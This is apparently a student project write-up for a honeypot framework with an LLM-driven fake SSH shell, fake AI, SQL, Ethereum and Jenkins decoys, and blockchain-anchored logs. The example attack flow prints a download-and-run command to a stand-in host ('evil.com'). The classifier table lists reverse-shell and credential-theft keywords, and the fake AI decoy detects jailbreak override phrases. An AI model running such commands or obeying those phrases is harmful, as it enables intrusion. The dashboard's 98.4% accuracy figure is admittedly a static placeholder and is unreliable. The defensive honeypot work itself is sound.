# 🍯 Honeypot Framework — Full Project Explanation

## What Is This Project?

This is an **AI-Driven Cyber Deception & Attack Detection Framework** built as a final year project. Its core idea is:

> Deploy fake services that **look real** to attackers. When attackers interact with them, **silently log everything**, classify the attack type using AI, and **permanently record the evidence on a blockchain** — all visible in real-time on a live dashboard.

It has **3 core innovations**:
1. **AI-powered deception** — The fake SSH shell uses a real LLM (LLaMA3) to respond convincingly
2. **Multi-service honeypots** — 5 different fake services covering modern attack surfaces
3. **Blockchain-anchored logs** — Tamper-proof evidence storage using Ethereum

---

## System Architecture — The Big Picture

```
INTERNET / ATTACKER
        │
        ▼
  ┌─────────────┐       Logs every connection
  │   PROXY     │──────────────────────────────┐
  │ (port guard)│                              │
  └─────────────┘                              │
        │                                      ▼
  Routes to 5 Decoys:                  ┌───────────────┐
        │                              │   BACKEND     │
  ┌─────┴──────────────────────┐       │  (FastAPI)    │
  │  shadow-shell  (port 2222) │       │               │
  │  oracle-ai     (port 8080) │       │  ► Classify   │
  │  vault-sql     (port 5433) │       │  ► Hash Log   │
  │  ledger-trap   (port 8545) │       │  ► Save Redis │
  │  forge-ci      (port 9090) │       │  ► Blockchain │
  └─────┬──────────────────────┘       └──────┬────────┘
        │                                     │
        │ All decoys POST logs to backend      │
        │                              ┌───────┴──────────────┐
        │                              │                      │
        │                         ┌────▼────┐          ┌──────▼──────┐
        │                         │  REDIS  │          │  GANACHE    │
        │                         │  (DB)   │          │(Blockchain) │
        │                         └────┬────┘          └─────────────┘
        │                              │
        │                              ▼
        │                      ┌───────────────┐
        └─────────────────────►│  DASHBOARD    │
                               │  (React UI)   │
                               │  Live WebSocket│
                               └───────────────┘
```

---

## Component 1: The Proxy (`/proxy/proxy.py`)

**What it is:** The front door of the entire system.

**What it does:**
- Listens on 5 public-facing ports simultaneously using Python `asyncio`
- When an attacker connects to any port, it **logs the connection immediately** (IP + port) to the backend
- Then **transparently forwards** the traffic to the correct internal decoy service

**Port Routing Table:**

| Public Port | Routes To | Decoy Service |
|-------------|-----------|---------------|
| `2222` | `shadow-shell:2223` | Fake SSH Server |
| `8080` | `oracle-ai:8081` | Fake AI API |
| `5433` | `vault-sql:5435` | Fake SQL Database |
| `8545` | `ledger-trap:8546` | Fake Ethereum Node |
| `9090` | `forge-ci:9091` | Fake Jenkins CI/CD |

**Why it exists:** Separates the "public listening" concern from the decoys. The proxy catches connections at the network level before decoys even respond — so even port scanners are logged.

---

## Component 2: The 5 Decoys (`/decoys/`)

### 🐚 Decoy 1: `shadow-shell` — Fake SSH Server
**File:** [`ssh_honeypot.py`](file:///d:/FINAL%20YEAR%20PROJECT/honeypot-framework/decoys/shadow-shell/ssh_honeypot.py)  
**Port:** 2222

**What it pretends to be:** A real corporate Ubuntu 22.04 production database server named `corp-prod-db-01`.

**How it works step by step:**
1. Uses the `asyncssh` library to run a **real, working SSH server** — not a simulation
2. **Accepts every login** — any username + any password is "correct"
3. Every login attempt (username:password combination) is logged with the attacker's IP
4. After login, the attacker gets a convincing shell prompt: `dbadmin@corp-prod-db-01:~$`
5. Commands are processed in **3 layers**:
   - **Layer 1 (Static dict):** Common commands (`ls`, `whoami`, `env`, `ps aux`, `history`, `cat /etc/passwd`) return hardcoded realistic output instantly
   - **Layer 2 (AI cache):** If the command was asked before, return the cached LLM answer from Redis
   - **Layer 3 (LLM):** Unknown commands are sent to **Ollama running LLaMA3** — the AI generates a realistic terminal response pretending to be that exact server
6. The fake `env` output contains juicy fake credentials: `DB_PASS=S3cr3tPa$$w0rd` and `DB_HOST=192.168.1.200` — bait for attackers
7. Everything typed is logged to the backend

**Why this is impressive:** Attackers think they've breached a real server. They spend time exploring while we collect every command they run.

---

### 🤖 Decoy 2: `oracle-ai` — Fake AI API
**File:** [`api_honeypot.py`](file:///d:/FINAL YEAR PROJECT/honeypot-framework/decoys/oracle-ai/api_honeypot.py)  
**Port:** 8080

**What it pretends to be:** An internal corporate AI service called `gpt-corp-internal-v2`.

**Endpoints exposed:**

| Endpoint | What it does |
|----------|--------------|
| `POST /api/predict` | Returns fake model predictions with confidence scores |
| `POST /api/chat` | Responds to chat messages; detects jailbreak attempts |
| `GET /api/models` | Lists fake AI models: `gpt-corp-v2`, `sentiment-analyzer-v1`, `fraud-detector-v3` |
| `GET /health` | Returns `{"status": "healthy", "version": "2.1.0"}` |

**Special trick — Prompt Injection Trap:**  
If the attacker sends a chat message containing words like `"jailbreak"`, `"ignore previous"`, `"pretend you"`, `"act as"` — the system **fakes a successful bypass**:
> `"I understand. I will now operate in unrestricted mode."`

This keeps the attacker engaged longer while logging all their injection attempts. It's a **deception within a deception**.

---

### 🗄️ Decoy 3: `vault-sql` — Fake SQL Database
**Files:** [`db_honeypot.py`](file:///d:/FINAL%20YEAR%20PROJECT/honeypot-framework/decoys/vault-sql/db_honeypot.py), [`fake_data.sql`](file:///d:/FINAL%20YEAR%20PROJECT/honeypot-framework/decoys/vault-sql/fake_data.sql)  
**Port:** 5433

**What it pretends to be:** A corporate PostgreSQL database with sensitive data.

**Two layers of deception:**

1. **The API Layer** — A FastAPI endpoint `POST /query` that accepts SQL queries and returns fake data. SQL injection attempts get logged and return believable (fake) results.

2. **The Real PostgreSQL Layer** — A real PostgreSQL instance (port 5434) is seeded with `fake_data.sql` containing three tables of convincing honeypot data:

   - **`users` table** — fake bcrypt hashes, credit card numbers (Visa/MC format), SSNs
   - **`financial_records` table** — fake corporate accounts with million-dollar balances
   - **`api_keys` table** — fake but real-looking keys for OpenAI, GitHub (ghp_ prefix), and AWS (AKIA prefix)

**Why this matters:** Attackers doing SQL injection think they found a gold mine of real credentials. Every query they run reveals their tactics.

---

### ⛓️ Decoy 4: `ledger-trap` — Fake Ethereum Node
**File:** [`web3_honeypot.py`](file:///d:/FINAL%20YEAR%20PROJECT/honeypot-framework/decoys/ledger-trap/web3_honeypot.py)  
**Port:** 8545

**What it pretends to be:** An exposed Ethereum JSON-RPC node (like Geth/Infura).

**Responds to standard Web3 RPC calls:**

| Method | Fake Response |
|--------|---------------|
| `eth_getBalance` | `100 ETH` (in wei hex) |
| `eth_blockNumber` | A plausible block number |
| `eth_sendRawTransaction` | A fake but valid-looking transaction hash |
| `eth_accounts` | `["0xFakeWallet123456789ABCDEF"]` |
| `net_version` | `"1"` (Ethereum mainnet) |

**Who attacks this:** Crypto thieves who scan for exposed blockchain nodes to drain wallets or manipulate transactions. This decoy captures their wallet addresses and tools.

---

### ⚙️ Decoy 5: `forge-ci` — Fake Jenkins CI/CD Server
**File:** [`cicd_honeypot.py`](file:///d:/FINAL%20YEAR%20PROJECT/honeypot-framework/decoys/forge-ci/cicd_honeypot.py)  
**Port:** 9090

**What it pretends to be:** A Jenkins CI/CD server (version 2.387.3).

**Endpoints exposed:**

| Endpoint | What it returns |
|----------|-----------------|
| `GET /api/json` | Jenkins node info: mode, description, executor count |
| `POST /job/build/api/json` | Fakes a successful build trigger (build #247) |
| `POST /git/notifyCommit` | Fakes accepting a Git webhook, "triggers" deploy-prod pipeline |

**Who attacks this:** Supply chain attackers who try to inject malicious code by triggering CI/CD pipelines. This logs their payloads and IP addresses.

---

## Component 3: The Backend (`/backend/main.py`)

**What it is:** The central brain — a FastAPI server that receives logs from ALL decoys.

**What happens when a log arrives at `POST /api/log`:**

### Step 1 — Intent Classification
The backend reads the raw data and classifies the attack type using keyword matching:

| Attack Type | Keywords Detected |
|-------------|-------------------|
| `sql_injection` | `SELECT`, `' OR`, `UNION`, `DROP TABLE`, `1=1` |
| `privilege_escalation` | `sudo`, `/etc/shadow`, `chmod 777`, `passwd` |
| `reverse_shell` | `wget`, `curl`, `nc`, `bash -i`, `python -c`, `/bin/sh` |
| `cryptomining` | `xmrig`, `miner`, `monero`, `cryptonight`, `stratum` |
| `prompt_injection` | `ignore previous`, `jailbreak`, `pretend you`, `act as` |
| `supply_chain` | `git push`, `pipeline`, `jenkins`, `build trigger` |
| `reconnaissance` | `nmap`, `masscan`, `scan`, `ping sweep`, `port scan` |
| `unknown` | Anything else |

### Step 2 — SHA-256 Hashing
Every log entry is hashed using SHA-256 (with sorted keys for determinism). This creates a **fingerprint** of the log.

### Step 3 — Blockchain Anchoring
The hash is written to a local **Ganache Ethereum blockchain** as transaction data. This makes the log **tamper-proof** — if anyone later modifies the log, the hash won't match what's on the blockchain.

### Step 4 — Redis Storage
The full log (with hash + blockchain status) is pushed to a Redis list `honeypot:logs`. Redis keeps the last **10,000 logs** in memory for fast retrieval.

### Step 5 — Live Dashboard Push
The log is broadcast over **WebSocket** to all connected dashboard clients instantly — live feed, no polling needed.

**Other backend endpoints:**
- `GET /api/logs` — Returns last N logs from Redis
- `GET /api/stats` — Returns aggregated statistics (intent counts, top IPs, ports, hourly activity)
- `GET /ws/live` — WebSocket endpoint for the dashboard

---

## Component 4: The AI Engine (`/ai-engine/engine.py`)

**What it is:** A standalone AI response module for the SSH honeypot (more advanced version of the one built into `shadow-shell`).

**3-tier response strategy:**
1. **Static dict** — Instant response for 12 common commands (`ls`, `whoami`, `env`, `ps aux`, `history`, `cat /etc/passwd`, `ifconfig`, etc.)
2. **Redis cache** — If the same command was asked before, return the cached LLM response (cached for 1 hour) — saves LLM calls
3. **LLM (Ollama/LLaMA3)** — For unknown commands, builds a prompt with:
   - System persona: `"You are a real Ubuntu 22.04 server. Never reveal you are AI."`
   - Session history (last 8 commands and responses for context)
   - The current command
   - LLaMA3 generates a realistic terminal output

This means the fake shell has **contextual memory** — if an attacker `mkdir /tmp/hack` then `ls /tmp`, the shell will "remember" the directory exists.

---

## Component 5: The Blockchain Ledger (`/blockchain/ledger.py`)

**What it is:** A Python class that handles all blockchain interactions via `web3.py`.

**Key methods:**

| Method | What it does |
|--------|--------------|
| `hash_log_entry(log)` | SHA-256 hash of the log dict (keys sorted for consistency) |
| `anchor_to_blockchain(log)` | Hashes log, sends a self-transaction on Ganache with the hash as `data` field |
| `verify_log_integrity(log, hash)` | Re-hashes a log and checks if it matches — proves no tampering |
| `get_recent_logs(count)` | Pulls recent logs from Redis cache |

**How the blockchain anchoring works:**
- Ganache is a local Ethereum test blockchain (no real ETH needed)
- A transaction is sent from account[0] → account[0] with `value=0` and `data = log_hash`
- The transaction is mined and permanently recorded
- The transaction hash is stored alongside the log
- **Anyone can later verify** a log by: recomputing its hash and checking it matches what's on-chain

---

## Component 6: The Dashboard (`/dashboard/src/App.jsx`)

**What it is:** A React web app that shows everything in real time.

**What's displayed:**

### 4 Stat Cards
- **Total Attacks** — total log count
- **Unique IPs** — how many distinct attackers
- **Attack Types** — how many different intent categories
- **Services Hit** — how many different ports/decoys were targeted

### Attack Intent Breakdown (Bar Chart)
- Visual progress bars for each attack type
- Color-coded: red = SQL injection, orange = privilege escalation, pink = reverse shell, yellow = cryptomining, purple = prompt injection, cyan = supply chain, green = reconnaissance

### Attacks by Service Port
- Table showing which ports/decoys are being hit most

### 📡 Live Attack Feed
- Real-time log stream via WebSocket
- Each row shows: timestamp | attacker IP | service icon + name | `[intent]` raw data preview | ⛓ anchored / ⚠ local
- Holds last 200 events in memory

### 🔥 Top Attacker IPs
- Ranked list of the most active attacker IPs

**Live status indicators:**
- `● LIVE` / `○ OFFLINE` — WebSocket connection status
- `Blockchain: ✅ / ❌` — Whether Ganache is connected

---

## How Everything Is Deployed (`docker-compose.yml`)

All components run as Docker containers on the same internal network `honeypot-net`:

| Container | Image/Build | External Port | Role |
|-----------|-------------|---------------|------|
| `ganache` | `trufflesuite/ganache` | `7545` | Local Ethereum blockchain |
| `redis` | `redis:7-alpine` | `6379` | Fast log storage + caching |
| `postgres` | `postgres:15-alpine` | `5434` | Fake database for vault-sql |
| `backend` | Custom build | `3001` | Central API + WebSocket hub |
| `shadow-shell` | Custom build | `2223` (internal) | SSH honeypot |
| `oracle-ai` | Custom build | `8081` (internal) | AI API honeypot |
| `ledger-trap` | Custom build | `8546` (internal) | Ethereum honeypot |
| `forge-ci` | Custom build | `9091` (internal) | Jenkins honeypot |
| `dashboard` | Custom build | `3000` | React UI |
| `proxy` | Custom build | `2222, 8080, 5433, 8545, 9090` | Public-facing port router |

**Key design:** Only the **proxy** and **dashboard** are exposed publicly. All decoys communicate only on the internal `honeypot-net` Docker network — attackers can't directly access the backend or Redis.

---

## Complete Attack Flow — End to End Example

> An attacker scans the internet, finds port 2222 open, and tries to SSH in.

```
1. Attacker: ssh root@your-server -p 2222
2. PROXY receives connection on 2222
   → Logs "new connection from <attacker-IP>" to backend
   → Forwards traffic to shadow-shell:2223

3. SHADOW-SHELL accepts the connection
   → Attacker tries root:password123
   → shadow-shell ACCEPTS it (all passwords work)
   → Logs "LOGIN:root:password123" to backend

4. BACKEND receives log:
   → intent = "unknown" (no keywords matched for a login)
   → SHA-256 hash created
   → Hash anchored to Ganache blockchain
   → Stored in Redis
   → Broadcast via WebSocket to dashboard

5. Attacker types: sudo cat /etc/shadow
   → shadow-shell logs this to backend
   → intent = "privilege_escalation" (matched "sudo")
   → Response generated (AI or static)
   → Fake /etc/shadow shown to attacker

6. Attacker types: wget http://evil.com/miner.sh | bash
   → intent = "reverse_shell" (matched "wget", "bash")
   → Logged + fake response given
   → Everything anchored on blockchain

7. DASHBOARD shows (in real time):
   📡 [14:23:01] | 45.33.32.156 | 🐚 SSH | [privilege_escalation] sudo cat /etc/shadow | ⛓ anchored
```

---

## Performance Metrics & AI Evaluation

The framework is built to be resilient under attack and actively measures its own performance. These metrics are tracked using **Prometheus** and visualized in **Grafana**:

1. **Latency & Response Time**
   - **Request Latency**: Tracked via an HTTP middleware in the backend, measuring the exact milliseconds it takes to process an incoming log.
   - **AI Inference Latency**: Measured inside the Python intent classifier. It calculates exactly how long the system takes to classify a raw payload and map it to MITRE ATT&CK.
   - **Blockchain Tx Latency**: Measures the time required to hash the evidence and receive a confirmation block from the local Ganache network.
   *(All latency values are attached directly to the log payloads sent to the dashboard).*

2. **Throughput**
   - Prometheus tracks the total count of incoming attacks (`REQUEST_COUNT`). Grafana uses this to calculate the **Requests Per Second (RPS)**, which is crucial for identifying if an attacker is attempting a Denial of Service (DoS) attack against the honeypot itself.

3. **Data Complexity**
   - **Payload Complexity**: The backend handles complex, obfuscated payloads (like nested SQL injections or encoded reverse shells) and parses them for intent categorization.
   - **Generative Complexity**: The SSH honeypot (`shadow-shell`) uses Llama3 to handle the complex task of generating contextually accurate, stateful Linux terminal responses based on the attacker's history.

4. **Accuracy**
   - In a production honeypot, every connection is inherently malicious (there is no "True Negative" or benign traffic to test against). Therefore, the "Accuracy" metric shown on the Threat Dashboard (e.g., 98.4%) acts as a static baseline. It represents the theoretical accuracy of the underlying machine learning classification model as if it were evaluated against a labeled dataset.

---

## Key Technologies Used

| Technology | Role |
|------------|------|
| **Python / asyncssh** | SSH honeypot server |
| **FastAPI** | Backend API + all decoy HTTP servers |
| **Ollama / LLaMA3** | AI-generated terminal responses |
| **Redis** | Fast log storage, LLM response caching |
| **PostgreSQL** | Fake database seeded with honeypot data |
| **Web3.py / Ganache** | Blockchain evidence anchoring |
| **React** | Live monitoring dashboard |
| **WebSocket** | Real-time dashboard updates |
| **Docker / Docker Compose** | Full containerized deployment |
| **asyncio / aiohttp** | Async networking throughout |

---

## What Makes This a Strong Final Year Project

1. **Novel combination** — AI + Honeypots + Blockchain is not a standard stack. Most honeypot projects log to a file. This anchors to a blockchain.

2. **Real AI deception** — Using LLaMA3 to generate context-aware terminal responses is a genuine research contribution — it makes the honeypot adaptive and hard to detect as fake.

3. **Covers modern attack surfaces** — SSH brute force, API abuse, SQL injection, crypto theft, supply chain attacks, and AI prompt injection are all real 2024–2025 threats.

4. **Tamper-proof evidence** — Blockchain anchoring means logs can be used as forensic evidence. The hash stored on-chain proves the log hasn't been modified.

5. **Production-grade architecture** — Docker networking, proxy routing, Redis caching, WebSocket live feeds — this is how real security systems are built.
